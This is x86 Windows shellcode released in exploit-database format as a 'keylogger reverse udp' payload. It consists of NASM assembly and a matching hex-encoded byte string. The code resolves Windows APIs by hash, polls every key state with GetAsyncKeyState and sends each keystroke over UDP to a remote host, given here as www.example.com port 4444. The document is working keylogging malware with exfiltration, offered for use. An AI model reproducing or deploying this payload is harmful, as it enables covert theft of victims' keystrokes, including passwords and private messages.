; Exploit Title: x86 windows shellcode - keylogger reverse udp - 493 bytes
; Date: Fri Oct 13 12:58:35 GMT 2016
; Exploit Author: Fugu
; Vendor Homepage: www.microsoft.com
; Version: all win
; Tested on: Windows 7(x86), 8.1(x86), 10(x86_64)
; Note: it will write to single byte payload udp packets to host.
;       keystrokes are written in format: "Virtual-Key Codes", from
;       msdn.microsoft.com website

section .bss

section .data

section .text
   global _start
      _start:
    cld										; 00000000 FC
    call dword loc_88h						; 00000001 E882000000
    pushad									; 00000006 60
    mov ebp,esp								; 00000007 89E5
    xor eax,eax								; 00000009 31C0
    mov edx,[fs:eax+0x30]					; 0000000B 648B5030
    mov edx,[edx+0xc]						; 0000000F 8B520C
    mov edx,[edx+0x14]						; 00000012 8B5214
loc_15h:
    mov esi,[edx+0x28]						; 00000015 8B7228
    movzx ecx,word [edx+0x26]				; 00000018 0FB74A26
    xor edi,edi								; 0000001C 31FF
loc_1eh:
    lodsb									; 0000001E AC
    cmp al,0x61								; 0000001F 3C61
    jl loc_25h								; 00000021 7C02
    sub al,0x20								; 00000023 2C20
loc_25h:
    ror edi,byte 0xd						; 00000025 C1CF0D
    add edi,eax								; 00000028 01C7
    loop loc_1eh							; 0000002A E2F2
    push edx								; 0000002C 52
    push edi								; 0000002D 57
    mov edx,[edx+0x10]						; 0000002E 8B5210
    mov ecx,[edx+0x3c]						; 00000031 8B4A3C
    mov ecx,[ecx+edx+0x78]					; 00000034 8B4C1178
    jecxz loc_82h							; 00000038 E348
    add ecx,edx								; 0000003A 01D1
    push ecx								; 0000003C 51
    mov ebx,[ecx+0x20]						; 0000003D 8B5920
    add ebx,edx								; 00000040 01D3
    mov ecx,[ecx+0x18]						; 00000042 8B4918
loc_45h:
    jecxz loc_81h							; 00000045 E33A
    dec ecx									; 00000047 49
    mov esi,[ebx+ecx*4]						; 00000048 8B348B
    add esi,edx								; 0000004B 01D6
    xor edi,edi								; 0000004D 31FF
loc_4fh:
    lodsb									; 0000004F AC
    ror edi,byte 0xd						; 00000050 C1CF0D
    add edi,eax								; 00000053 01C7
    cmp al,ah								; 00000055 38E0
    jnz loc_4fh								; 00000057 75F6
    add edi,[ebp-0x8]						; 00000059 037DF8
    cmp edi,[ebp+0x24]						; 0000005C 3B7D24
    jnz loc_45h								; 0000005F 75E4
    pop eax									; 00000061 58
    mov ebx,[eax+0x24]						; 00000062 8B5824
    add ebx,edx								; 00000065 01D3
    mov cx,[ebx+ecx*2]						; 00000067 668B0C4B
    mov ebx,[eax+0x1c]						; 0000006B 8B581C
    add ebx,edx								; 0000006E 01D3
    mov eax,[ebx+ecx*4]						; 00000070 8B048B
    add eax,edx								; 00000073 01D0
    mov [esp+0x24],eax						; 00000075 89442424
    pop ebx									; 00000079 5B
    pop ebx									; 0000007A 5B
    popad									; 0000007B 61
    pop ecx									; 0000007C 59
    pop edx									; 0000007D 5A
    push ecx								; 0000007E 51
    jmp eax									; 0000007F FFE0
loc_81h:
    pop edi									; 00000081 5F
loc_82h:
    pop edi									; 00000082 5F
    pop edx									; 00000083 5A
    mov edx,[edx]							; 00000084 8B12
    jmp short loc_15h						; 00000086 EB8D
loc_88h:
    pop ebp									; 00000088 5D
    push dword 0x3233						; 00000089 6833320000
    push dword 0x5f327377					; 0000008E 687773325F
    push esp								; 00000093 54
    push dword 0x726774c					; 00000094 684C772607
    call ebp								; 00000099 FFD5
    mov eax,0x190							; 0000009B B890010000
    sub esp,eax								; 000000A0 29C4
    push esp								; 000000A2 54
    push eax								; 000000A3 50
    push dword 0x6b8029						; 000000A4 6829806B00
    call ebp								; 000000A9 FFD5
    push byte +0x10							; 000000AB 6A10
    jmp dword loc_1ceh						; 000000AD E91C010000
loc_b2h:
    push dword 0x803428a9					; 000000B2 68A9283480
    call ebp								; 000000B7 FFD5
    lea esi,[eax+0x1c]						; 000000B9 8D701C
    xchg esi,esp							; 000000BC 87F4
    pop eax									; 000000BE 58
    xchg esp,esi							; 000000BF 87E6
    mov esi,eax								; 000000C1 89C6
    push dword 0x6c6c						; 000000C3 686C6C0000
    push dword 0x642e7472					; 000000C8 6872742E64
    push dword 0x6376736d					; 000000CD 686D737663
    push esp								; 000000D2 54
    push dword 0x726774c					; 000000D3 684C772607
    call ebp								; 000000D8 FFD5
    jmp dword loc_1e3h						; 000000DA E904010000
loc_dfh:
    push dword 0xd1ecd1f					; 000000DF 681FCD1E0D
    call ebp								; 000000E4 FFD5
    xchg ah,al								; 000000E6 86E0
    ror eax,byte 0x10						; 000000E8 C1C810
    inc eax									; 000000EB 40
    inc eax									; 000000EC 40
    push esi								; 000000ED 56
    push eax								; 000000EE 50
    mov esi,esp								; 000000EF 89E6
    xor eax,eax								; 000000F1 31C0
    push eax								; 000000F3 50
    push eax								; 000000F4 50
    push eax								; 000000F5 50
    push eax								; 000000F6 50
    inc eax									; 000000F7 40
    inc eax									; 000000F8 40
    push eax								; 000000F9 50
    push eax								; 000000FA 50
    push dword 0xe0df0fea					; 000000FB 68EA0FDFE0
    call ebp								; 00000100 FFD5
    mov edi,eax								; 00000102 89C7
loc_104h:
    push byte +0x10							; 00000104 6A10
    push esi								; 00000106 56
    push edi								; 00000107 57
    push dword 0x6174a599					; 00000108 6899A57461
    call ebp								; 0000010D FFD5
    test eax,eax							; 0000010F 85C0
    jz loc_122h								; 00000111 740F
    dec dword [esi+0x8]						; 00000113 FF4E08
    jnz loc_104h							; 00000116 75EC
    xor eax,eax								; 00000118 31C0
    push eax								; 0000011A 50
    push dword 0x56a2b5f0					; 0000011B 68F0B5A256
    call ebp								; 00000120 FFD5
loc_122h:
    push dword 0x3233						; 00000122 6833320000
    push dword 0x72657375					; 00000127 6875736572
    push esp								; 0000012C 54
    push dword 0x726774c					; 0000012D 684C772607
    call ebp								; 00000132 FFD5
    push dword 0x657461						; 00000134 6861746500
    push dword 0x74537965					; 00000139 6865795374
    push dword 0x4b746547					; 0000013E 684765744B
    push esp								; 00000143 54
    push eax								; 00000144 50
    push dword 0x7802f749					; 00000145 6849F70278
    call ebp								; 0000014A FFD5
    push esi								; 0000014C 56
    push edi								; 0000014D 57
    push eax								; 0000014E 50
    xor ecx,ecx								; 0000014F 31C9
    mov esi,ecx								; 00000151 89CE
    mov cl,0x8								; 00000153 B108
loc_155h:
    push esi								; 00000155 56
    loop loc_155h							; 00000156 E2FD
loc_158h:
    xor ecx,ecx								; 00000158 31C9
    xor esi,esi								; 0000015A 31F6
    push byte +0x8							; 0000015C 6A08
    push dword 0xe035f044					; 0000015E 6844F035E0
    call ebp								; 00000163 FFD5
loc_165h:
    mov eax,esi								; 00000165 89F0
    cmp al,0xff								; 00000167 3CFF
    jnc loc_158h							; 00000169 73ED
    inc esi									; 0000016B 46
    push esi								; 0000016C 56
    call dword [esp+0x24]					; 0000016D FF542424
    mov edx,esi								; 00000171 89F2
    xor ecx,ecx								; 00000173 31C9
    mov cl,0x80								; 00000175 B180
    and eax,ecx								; 00000177 21C8
    xor ecx,ecx								; 00000179 31C9
    cmp eax,ecx								; 0000017B 39C8
    jnz loc_18fh							; 0000017D 7510
    xor edx,edx								; 0000017F 31D2
    mov ecx,edx								; 00000181 89D1
    mov eax,esi								; 00000183 89F0
    mov cl,0x20								; 00000185 B120
    div ecx									; 00000187 F7F1
    btr [esp+eax*4],edx						; 00000189 0FB31484
    jmp short loc_165h						; 0000018D EBD6
loc_18fh:
    xor edx,edx								; 0000018F 31D2
    mov ecx,edx								; 00000191 89D1
    mov eax,esi								; 00000193 89F0
    mov cl,0x20								; 00000195 B120
    div ecx									; 00000197 F7F1
    bt [esp+eax*4],edx						; 00000199 0FA31484
    jc loc_165h								; 0000019D 72C6
    xor edx,edx								; 0000019F 31D2
    mov ecx,edx								; 000001A1 89D1
    mov eax,esi								; 000001A3 89F0
    mov cl,0x20								; 000001A5 B120
    div ecx									; 000001A7 F7F1
    bts [esp+eax*4],edx						; 000001A9 0FAB1484
    push esi								; 000001AD 56
    push byte +0x10							; 000001AE 6A10
    push dword [esp+0x30]					; 000001B0 FF742430
    push byte +0x0							; 000001B4 6A00
    push byte +0x1							; 000001B6 6A01
    lea ecx,[esp+0x10]						; 000001B8 8D4C2410
    push ecx								; 000001BC 51
    push dword [esp+0x3c]					; 000001BD FF74243C
    push dword 0xdf5c9d75					; 000001C1 68759D5CDF
    call ebp								; 000001C6 FFD5
    lea esp,[esp+0x4]						; 000001C8 8D642404
    jmp short loc_158h						; 000001CC EB8A
loc_1ceh:
    call dword loc_b2h						; 000001CE E8DFFEFFFF
    db "www.example.com",0
loc_1e3h:
    call dword loc_dfh
    db "4444",0

;"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b"
;"\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c"
;"\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
;"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20"
;"\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac"
;"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
;"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
;"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
;"\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
;"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00"
;"\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x10\xe9\x1c\x01"
;"\x00\x00\x68\xa9\x28\x34\x80\xff\xd5\x8d\x70\x1c\x87\xf4\x58\x87"
;"\xe6\x89\xc6\x68\x6c\x6c\x00\x00\x68\x72\x74\x2e\x64\x68\x6d\x73"
;"\x76\x63\x54\x68\x4c\x77\x26\x07\xff\xd5\xe9\x04\x01\x00\x00\x68"
;"\x1f\xcd\x1e\x0d\xff\xd5\x86\xe0\xc1\xc8\x10\x40\x40\x56\x50\x89"
;"\xe6\x31\xc0\x50\x50\x50\x50\x40\x40\x50\x50\x68\xea\x0f\xdf\xe0"
;"\xff\xd5\x89\xc7\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85"
;"\xc0\x74\x0f\xff\x4e\x08\x75\xec\x31\xc0\x50\x68\xf0\xb5\xa2\x56"
;"\xff\xd5\x68\x33\x32\x00\x00\x68\x75\x73\x65\x72\x54\x68\x4c\x77"
;"\x26\x07\xff\xd5\x68\x61\x74\x65\x00\x68\x65\x79\x53\x74\x68\x47"
;"\x65\x74\x4b\x54\x50\x68\x49\xf7\x02\x78\xff\xd5\x56\x57\x50\x31"
;"\xc9\x89\xce\xb1\x08\x56\xe2\xfd\x31\xc9\x31\xf6\x6a\x08\x68\x44"
;"\xf0\x35\xe0\xff\xd5\x89\xf0\x3c\xff\x73\xed\x46\x56\xff\x54\x24"
;"\x24\x89\xf2\x31\xc9\xb1\x80\x21\xc8\x31\xc9\x39\xc8\x75\x10\x31"
;"\xd2\x89\xd1\x89\xf0\xb1\x20\xf7\xf1\x0f\xb3\x14\x84\xeb\xd6\x31"
;"\xd2\x89\xd1\x89\xf0\xb1\x20\xf7\xf1\x0f\xa3\x14\x84\x72\xc6\x31"
;"\xd2\x89\xd1\x89\xf0\xb1\x20\xf7\xf1\x0f\xab\x14\x84\x56\x6a\x10"
;"\xff\x74\x24\x30\x6a\x00\x6a\x01\x8d\x4c\x24\x10\x51\xff\x74\x24"
;"\x3c\x68\x75\x9d\x5c\xdf\xff\xd5\x8d\x64\x24\x04\xeb\x8a\xe8\xdf"
;"\xfe\xff\xff\x77\x77\x77\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63"
;"\x6f\x6d\x00\xe8\xf7\xfe\xff\xff\x34\x34\x34\x34\x00"